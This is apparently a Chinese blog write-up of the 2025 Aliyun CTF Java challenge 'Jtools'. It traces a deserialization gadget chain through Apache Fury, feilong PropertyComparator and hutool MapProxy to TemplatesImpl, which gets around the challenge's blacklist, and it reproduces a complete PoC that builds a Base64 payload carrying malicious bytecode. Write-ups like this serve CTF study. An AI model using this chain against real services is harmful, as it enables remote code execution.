---
title: "2025Aliyun CTF Jtools"
onlyTitle: true
date: 2025-2-28 15:56:09
categories:
- ctf
- WP
tags:
- CTF
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8133.jpg

---



第三届阿里云CTF，复现两道JAVA，应该很多地方都能找到靶场。我是用的赛后环境，趁热用https://www.aliyunctf.com/challenges

结果发现第二道需要手动构造链表反序列化，大败而归



## Jtools

### 找到入口

现在JAVA题都已经演变成这种了吗，TM谁能想到找黑名单当hint啊？找到hint还得慢慢找入口类

解压后，idea配好JAR运行程序，直接导入Jtools.jar为库，就可以直接断点调试了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227204557175.png)

入口只有一个，就是com.app.Server 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227192334666.png)

用MANIFEST.MF定义了jar文件的入口为com.app.Server

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227193007081.png)

审计Server，就是个使用Fury库反序列化Base64编码的数据

Fury基本语法可以看apache fury官网：https://fury.apache.org/zh-CN/docs/guide/java_object_graph_guide/

但是没必要学会怎么使用，下面这个语句就是创建一个解析JAVA语言的Fury实例

```java
Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227193411923.png)

OK拿着WP装模作样调一下

跟进到Fury.deserialize，调用了另外一个参数的deserialize

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227210936917.png)

`deserialize(MemoryBuffer buffer, Iterable<MemoryBuffer> outOfBandBuffers)`就是根据魔数选用不同的反序列化，这里肯定不是XLANG协议，进到readRef

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211236191.png)

readRef调用readDataInternal

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211318882.png)

readDataInternal根据传入的对象类型选择不同的反序列化器。如果传的不是基础类型，就默认进到default调用对应反序列化器的read方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211413339.png)

从这里看不出fury有什么漏洞

注意到native-image.properties中，把DisallowedList也放到了启动时加载的类中

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227213421035.png)

>native-image.properties 是用于配置 GraalVM Native Image 编译选项的属性文件。它允许开发者指定在将 Java 应用程序编译为原生可执行文件时使用的各种参数和选项。

如果使用DisallowedList，则会从本地读取fury/disallowed.txt文件，应用黑名单。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227213637843.png)

从官网的org.apache.fury:fury-core:0.8.0，也找到一份disallowed.txt，diff一下发现少了一个sun.print，多了一个com.feilong.lib

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227215037890.png)

### compare

下面感觉是codeQL做的了（，正常真的很难找到入口类

`com.feilong.core.util.comparator.PropertyComparator#compare()`两个参数不为空且不同的情况下，调用了PropertyUtil.getProperty

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223158647.png)

接着调用了PropertyValueObtainer.obtain

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223320962.png)

object方法调用PropertyDescriptorUtil.isUseSpringOperate()判断本地是否有spring依赖，如果是就调用getDataUseSpring去获取数据，否则调用getDataUserApache以Apache的方式获取数据

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223453193.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223650671.png)

跟进getType，可以看到getType就是从缓存MAP里读取type，没有的话就调用buildType新建Type

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224113840.png)

buildType调用getSpringpropertyDescriptor获取类的属性描述符

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224208654.png)

>属性描述符（PropertyDescriptor）是 Java 中用于描述类的某个属性（字段）的元数据信息。它通常包含以下内容：
>属性名称、属性类型、获取该属性值的方法（getter 方法）、设置该属性值的方法（setter 方法）
>在 Java 中，PropertyDescriptor 类位于 java.beans 包中，常用于反射机制来获取和操作类的属性。通过 PropertyDescriptor，可以动态地访问对象的属性，而不需要直接调用 getter 和 setter 方法。

spring中就是检查是否存在SpringBeanUtils类，用这个类能更方便的返回属性描述符。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224907779.png)

>SpringBeanUtils 是Spring框架中的一个工具类，提供了多种与Bean操作相关的静态方法。在这个场景中，它主要用于获取属性描述符（PropertyDescriptor）。如果项目中没有引入Spring的相关依赖或类加载失败，SpringBeanUtils 类将不可用，此时方法会返回null。

扯远了，继续回到PropertyValueObtainer.obtain，这里没有spring依赖就调用getDataUseApache

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227225124821.png)

然后调用PropertyUtils.getPropety()，其实后面就和Shiro的CB链原理一样了，复习一遍还是敲上来

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230006545.png)

PropertyUtils.getPropety()调用到了PropertyUtilsBean.getProperty()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230437861.png)

然后调用getSimpleProperty

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230535360.png)

调用getReadMethod获取了所有的getter，然后invokeMethod进行调用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227231109755.png)

理一下思路，因为compare()是比较两个对象，所以会调用其对象的每个getter取出对应的属性值，形成一个Comparable进行比较，这就给了调用任意getter的空间

如果没有在spring环境下，会用Apache的方式处理数据。由于spring下有SpringBeanUtils，可以直接使用其静态方法getPropertyDescriptor得到属性描述符。而无spring依赖下，需要调用PropertyUtils.getProperty去获取对象的属性值，就调用到了对应的getter。那么理论上说来，spring环境下也是调用对应的getter去获取属性值，也会发生漏洞。只是走的路径不同而已。

所以以后看到compare就要想到任意getter的调用哇

其实这里的PropertyComparator入口类就是替代的CB链里的BeanComparator的作用

### fury反序列化触发compare

按照CB链触发compare的思路，前面接上PriorityQueue，就能得到如下的PriorityQueue.add->offer->siftUp->siftUpUsingComparator->PropertyComparator.compare的链子

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227231849194.png)

现在只需要找到触发PriorityQueue.add的地方

fury在反序列化PriorityQueue时，打个断点测试得知用的`org.apache.fury.serializer.collection.CollectionSerializers下的内部类PriorityQueueSerializer进行的处理

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133044708.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133417837.png)

由于该类并没有read方法，而其父类CollectionSerializer有，所以调用到的CollectionSerializer.read()，该方法有调用了readElements

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133512144.png)

然后检查集合下的元素序列化器是否存在，如果不存在，根据泛型类型选择不同的读取方法。这里传进去的元素没有泛型类型就默认调用generalJavaRead

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133706640.png)

然后调用readSameTypeElements

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228134341238.png)

readSameTypeElements内循环把每个元素序列化后的结果用add添加进collection

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228135920920.png)

也就是说传PriorityQueue默认调用PriorityQueueSerializer去反序列化，最后会用add将队列元素添加进去。

思路就理顺了，链子：

```java
PriorityQueue.add ->
    PropertyComparator.compare -> 任意getter
```



### 绕黑名单

别忘了上面的黑名单里面过滤了TempleatesImpl，不能直接反序列化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140605018.png)

这里提一嘴为什么可以直接触发com.feilong.lib.beanutils.PropertyUtilsBean#invokeMethod，因为这个类是衍生调用到的方法，并没有经过fury反序列化，也就不会触发黑名单

绕过的方式就是找一个二次反序列化的点

cn.hutool.core.map.MapProxy是个代理类，看到实现了InvocationHandler

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140952625.png)

代理类的话条件反射看到其invoke方法，调用了Convert.convert

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140902752.png)

跟进两步，到达convertWithCheck，接着调用了ConverterRegistry.convert

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141111719.png)

这里如果MapProxy代理的类是个Bean，就调用BeanConverter.convert

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141221949.png)

因为BeanConverter没有这个方法，转到父类调用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141327658.png)

convert参数不为空，且两个参数不为对方的子类，targetType不是Map的子类时，调用convertInternal

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141414089.png)

然后调用ObjectUtil.deserialize

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141640198.png)

然后跟到调用IoUtil.readObj，注意这里用ByteArrayInputStream包装了bytes

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141718797.png)

然后就是调用原生反序列化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141809728.png)

MapProxy.invoke就是个二次反序列化的点

二次反序列化就重新打一遍PriorityQueue触发到getter，也就是TemplatesImpl.getOutputProperties

```java
Fury.deserialize ->
    CollectionSerializer.read ->
    PriorityQueue.add ->
    PropertyComparator.compare ->
    PropertyUtilsBean.invokeMethod -> getter
    
    MapProxy.invoke ->
    BeanConverter.convertInternal ->
    readObject -> PriorityQueue.readObject ->
    TemplatesImpl.getOuputProperties
```

现在的问题是构造的MapProxy应该代理哪个对象的getter，注意到前面分析的时候在ConverterRegistry.convert，需要rowType满足isBean

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144016900.png)

也就是有setter和public 字段

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144133243.png)

我们又需要getter去触发到MapProxy.invoke，所以随便找个Bean接口，com.feilong.lib.digester3.ObjectCreationFactory就符合要求，propName传digester触发getter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144258064.png)

官方wp有poc，就不装模做样改一下了：

```java
import cn.hutool.core.map.MapProxy;
import cn.hutool.core.util.ReflectUtil;
import cn.hutool.core.util.SerializeUtil;
import com.feilong.core.util.comparator.PropertyComparator;
import com.feilong.lib.digester3.ObjectCreationFactory;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.fury.Fury;
import org.apache.fury.config.Language;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;


public class Main {

    static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field declaredField = obj.getClass().getDeclaredField(fieldName);
        declaredField.setAccessible(true);
        declaredField.set(obj, value);
    }


    public static void main(String[] args) throws Exception {
        ///templates

        InputStream inputStream = Main.class.getResourceAsStream("TemplatesImpl_RuntimeEvil.class");
        byte[]   bytes       = new byte[inputStream.available()];
        inputStream.read(bytes);

        TemplatesImpl tmpl      = new TemplatesImpl();
        Field    bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]{bytes});
        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmpl, "hello");


        TemplatesImpl tmpl1      = new TemplatesImpl();
        Field    bytecodes1 = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes1.setAccessible(true);
        bytecodes1.set(tmpl1, new byte[][]{bytes});
        Field name1 = TemplatesImpl.class.getDeclaredField("_name");
        name1.setAccessible(true);
        name1.set(tmpl1, "hello2");
        ///templates
        String prop = "digester";
        PropertyComparator propertyComparator = new PropertyComparator(prop);
        Fury fury = Fury.builder().withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .build();
        ////jdk

        Object templatesImpl1 = tmpl1;
        Object templatesImpl = tmpl;

        PropertyComparator propertyComparator1 = new PropertyComparator("outputProperties");

        PriorityQueue priorityQueue1 = new PriorityQueue(2, propertyComparator1);
        ReflectUtil.setFieldValue(priorityQueue1, "size", "2");
        Object[] objectsjdk = {templatesImpl1, templatesImpl};
        setFieldValue(priorityQueue1, "queue", objectsjdk);
        /////jdk

        byte[] data = SerializeUtil.serialize(priorityQueue1);

        Map hashmap = new HashMap();
        hashmap.put(prop, data);

        MapProxy mapProxy = new MapProxy(hashmap);
        ObjectCreationFactory  test = (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), new Class[]{ObjectCreationFactory.class}, mapProxy);
        ObjectCreationFactory  test1 = (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), new Class[]{ObjectCreationFactory.class}, mapProxy);


        PriorityQueue priorityQueue = new PriorityQueue(2, propertyComparator);
        ReflectUtil.setFieldValue(priorityQueue, "size", "2");
        Object[] objects = {test, test1};
        setFieldValue(priorityQueue, "queue", objects);

        byte[] serialize = fury.serialize(priorityQueue);
        System.out.println(Base64.getEncoder().encodeToString(serialize));

    }
}
```

题目不出网，Server默认回显/tmp/desc.txt的内容

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228145847451.png)



## Espresso Coffee

尼玛，ROP我做个蛋啊。不做了
